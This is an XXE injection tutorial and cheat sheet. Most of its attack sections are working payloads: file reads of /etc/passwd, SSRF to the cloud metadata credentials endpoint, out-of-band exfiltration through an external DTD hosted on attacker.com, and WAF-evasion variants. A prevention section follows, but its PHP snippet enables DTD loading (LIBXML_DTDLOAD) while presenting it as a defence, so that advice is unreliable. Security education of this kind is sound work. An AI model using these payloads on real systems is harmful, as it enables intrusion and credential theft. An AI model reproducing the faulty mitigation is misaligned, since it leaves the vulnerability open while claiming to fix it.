## XML External Entity (XXE) Injection

- **What it is**
  - A web security vulnerability that allows attackers to interfere with an application's processing of XML data
  - Exploits features of XML parsers and the XML specification itself
  - Can allow attackers to:
    - Access files on the application server filesystem
    - Interact with back-end systems
    - Perform server-side request forgery (SSRF)
    - In some cases, achieve remote code execution

- **XML basics and how vulnerabilities arise**
  
  - **XML Structure and DTD**
    - XML (eXtensible Markup Language) is a language for storing and transporting data
    - DTD (Document Type Definition) defines the structure and the legal elements of an XML document
    - <!DOCTYPE> declaration defines the DTD
    - Entities are variables used to define reusable content
      - Internal entities: `<!ENTITY entity-name "entity-value">`
      - External entities: `<!ENTITY entity-name SYSTEM "URI/URL/file path">`
    - XML processors automatically process entities and replace them with their values
  
  - **How XXE vulnerabilities arise**
    - Applications using XML inputs without disabling dangerous XML features
    - Standard XML parsers support external entities by default
    - Input validation or sanitization focusing only on XML structure, not content
    - Outdated or misconfigured XML processing libraries
    - Conversion of other formats to XML behind the scenes

- **Types of XXE attacks**
  
  - **Retrieving files from the server**
    - Uses external entities to access local files
    - Basic attack pattern:
      ```xml
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
      <root><data>&xxe;</data></root>
      ```
    - Common targets:
      - `/etc/passwd` (Unix)
      - `C:\Windows\win.ini` (Windows)
      - Application configuration files
      - Source code files
    - Detection: Output of file contents appears in the application's response
  
  - **SSRF via XXE**
    - Uses external entities to make server-side requests
    - Basic attack pattern:
      ```xml
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-server:8080/admin"> ]>
      <root><data>&xxe;</data></root>
      ```
    - Common targets:
      - Internal networks
      - Cloud metadata services (AWS, Azure, GCP)
      - Internal APIs and services
    - Detection: Server makes requests to the specified URLs
  
  - **Blind XXE**
    - Application processes XML but doesn't return entity values in responses
    - Detection requires out-of-band techniques or error-based approaches
    - More challenging but still exploitable

- **Finding and exploiting XXE vulnerabilities**
  
  - **Identifying potential XXE entry points**
    - Obvious XML data in requests/responses
    - Content-Type headers with XML-related values:
      - `application/xml`
      - `text/xml`
      - `application/soap+xml`
    - Functions with "xml" in their name
    - File upload features accepting XML formats (SVG, DOCX, etc.)
    - Legacy systems or SOAP web services
    - APIs with XML parsing capabilities
  
  - **Basic XXE exploitation**
    - **Step 1: Detect if XML parsing is vulnerable**
      - Test with a simple external entity:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <root><data>&xxe;</data></root>
        ```
      - Try different data nodes for entity insertion
      - Look for file content in responses
    
    - **Step 2: Explore filesystem access**
      - Read sensitive files:
        ```xml
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        ```
      - Access application-specific files:
        ```xml
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]>
        ```
      - Read base64-encoded binary files:
        ```xml
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
        ```
    
    - **Step 3: Leverage for SSRF**
      - Access internal services:
        ```xml
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-service:8080/api"> ]>
        ```
      - Target cloud metadata services:
        ```xml
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
        ```
      - Scan internal networks:
        ```xml
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://192.168.1.1/"> ]>
        ```

- **Advanced XXE techniques**
  
  - **Exploiting blind XXE vulnerabilities**
    
    - **Out-of-band (OOB) data exfiltration**
      - Using external DTD to extract and send data:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE data [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
        %dtd;
        ]>
        <data>content</data>
        ```
      - Contents of evil.dtd:
        ```xml
        <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
        %all;
        %send;
        ```
      - This technique sends the file contents to the attacker's server
    
    - **Error-based XXE data retrieval**
      - Using XML parsing errors to display file contents:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE data [
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
        %eval;
        %error;
        ]>
        <data>content</data>
        ```
      - The parser tries to access a file with a name derived from /etc/passwd
      - Error message will often contain the file contents
    
    - **Parameter entities for blind XXE**
      - Parameter entities (%) only used within DTD:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE data [
        <!ENTITY % param1 "file:///etc/passwd">
        <!ENTITY % param2 "<!ENTITY exfil SYSTEM '%param1;'>">
        %param2;
        ]>
        <data>&exfil;</data>
        ```
      - Allows more complex and chained entity declarations
  
  - **XXE in different contexts**
    
    - **XInclude attacks**
      - Used when you control only a fragment of XML:
        ```xml
        <foo xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include parse="text" href="file:///etc/passwd"/>
        </foo>
        ```
      - Works even when DOCTYPE is not controlled
      - Useful in SOAP requests, API calls, or other scenarios where XML is built server-side
    
    - **XXE via file upload**
      - SVG image upload:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <svg xmlns="http://www.w3.org/2000/svg">
          <text font-size="15" x="0" y="16">&xxe;</text>
        </svg>
        ```
      - Office documents (DOCX, XLSX, PPTX):
        - These are ZIP archives containing XML files
        - Modify relevant XML files to include XXE payloads
        - Repackage and upload
      - PDF manipulation:
        - Some PDF processing tools parse XML components
        - Include XXE payload in XML portions
    
    - **XXE via modified content type**
      - Change Content-Type to XML-based:
        ```
        Content-Type: application/x-www-form-urlencoded
        ```
        to
        ```
        Content-Type: application/xml
        ```
        or
        ```
        Content-Type: text/xml
        ```
      - Convert form parameters to XML structure:
        ```
        username=admin&password=password
        ```
        to
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <root>
          <username>admin</username>
          <password>&xxe;</password>
        </root>
        ```
      - Some frameworks automatically parse XML content types
  
  - **XXE in specific technologies**
    
    - **SOAP-based web services**
      - SOAP heavily uses XML for message format
      - Vulnerable pattern:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE soap:Envelope [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <ns:operation xmlns:ns="namespace">
              <ns:param>&xxe;</ns:param>
            </ns:operation>
          </soap:Body>
        </soap:Envelope>
        ```
    
    - **RSS/Atom feeds processing**
      - Applications that fetch and parse RSS/Atom feeds:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE rss [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <rss version="2.0">
          <channel>
            <title>&xxe;</title>
            <link>https://example.com/</link>
            <description>Description</description>
            <item>
              <title>Item Title</title>
              <link>https://example.com/item</link>
              <description>Item Description</description>
            </item>
          </channel>
        </rss>
        ```
      - Server-side feed aggregators often vulnerable
    
    - **XML-RPC/XMLRPC.NET**
      - Remote procedure call protocol using XML:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE methodCall [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <methodCall>
          <methodName>method</methodName>
          <params>
            <param>
              <value>&xxe;</value>
            </param>
          </params>
        </methodCall>
        ```

- **WAF bypass techniques**
  
  - **Using different encodings**
    - URL encoding: `file:///etc/passwd` → `file:///etc/%70asswd`
    - UTF-8 BOM encoding: Add BOM marker before payloads
    - UTF-16 encoding: Convert payload to UTF-16
  
  - **Using alternative payload formats**
    - Using PHP wrappers:
      ```xml
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
      ```
    - Using data URIs:
      ```xml
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ="> ]>
      ```
    - Protocol manipulation:
      ```xml
      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "jar:http://attacker.com/payload.jar!/payload.txt"> ]>
      ```
  
  - **Nested entities and indirection**
    - Combining multiple entities to obfuscate:
      ```xml
      <!DOCTYPE foo [
        <!ENTITY % a "fil">
        <!ENTITY % b "e:">
        <!ENTITY % c "///etc/passwd">
        <!ENTITY % d "%a;%b;%c;">
        <!ENTITY % e "<!ENTITY xxe SYSTEM '%d;'>">
        %e;
      ]>
      ```
  
  - **Custom DTD hosting**
    - External DTD with attack payload:
      ```xml
      <!DOCTYPE foo [
        <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
        %dtd;
      ]>
      ```
    - Allows more complex attacks while keeping main payload simple

- **Testing methodology for XXE**
  
  - **Manual testing approach**
    - Identify XML processing endpoints
    - Test basic entity injection
    - Try various payload placement locations
    - Attempt blind XXE techniques
    - Test different encodings
    - Try alternative protocols (file, http, php, etc.)
  
  - **Using tools for XXE detection**
    - Burp Suite Professional scanner
    - OWASP ZAP Active Scanner
    - XXEinjector
    - PayloadsAllTheThings XXE repository
  
  - **Common indicators of vulnerability**
    - XML parsing errors in responses
    - Content of targeted files appears in responses
    - Server makes outbound connections to attacker-controlled domains
    - Delayed responses when using time-based payloads

- **Prevention and mitigation**
  
  - **Configure XML parsers securely**
    - Disable external entities and DTD processing
      - Java:
        ```java
        // For DocumentBuilderFactory
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        
        // For SAXParserFactory
        SAXParserFactory spf = SAXParserFactory.newInstance();
        spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        ```
      
      - PHP:
        ```php
        // Using libxml_disable_entity_loader (PHP < 8.0)
        libxml_disable_entity_loader(true);
        
        // Using options parameter in simplexml_load_string/simplexml_load_file
        $options = LIBXML_NONET | LIBXML_DTDLOAD | LIBXML_DTDATTR;
        simplexml_load_string($xml, 'SimpleXMLElement', $options);
        ```
      
      - Python:
        ```python
        # Using defusedxml instead of standard libraries
        import defusedxml.ElementTree as ET
        ET.parse(xmlfile)
        
        # Or when using standard library
        from xml.sax import make_parser
        from xml.sax.handler import feature_external_ges, feature_external_pes
        
        parser = make_parser()
        parser.setFeature(feature_external_ges, False)
        parser.setFeature(feature_external_pes, False)
        ```
      
      - .NET:
        ```csharp
        // Using XmlReader
        XmlReaderSettings settings = new XmlReaderSettings();
        settings.DtdProcessing = DtdProcessing.Prohibit;
        settings.XmlResolver = null;
        XmlReader reader = XmlReader.Create(stream, settings);
        ```
  
  - **Input validation and sanitization**
    - Validate incoming XML against a strict schema
    - Sanitize user-supplied XML data before processing
    - Implement allowlists for acceptable XML content
  
  - **Use alternative data formats**
    - Consider JSON, YAML, or other formats instead of XML
    - Use secure serialization/deserialization libraries
  
  - **Defense in depth**
    - Implement appropriate access controls
    - Run XML parsers with restricted privileges
    - Monitor for suspicious outbound connections
    - Implement proper file permissions on sensitive files
    - Use WAF rules to detect and block XXE attacks
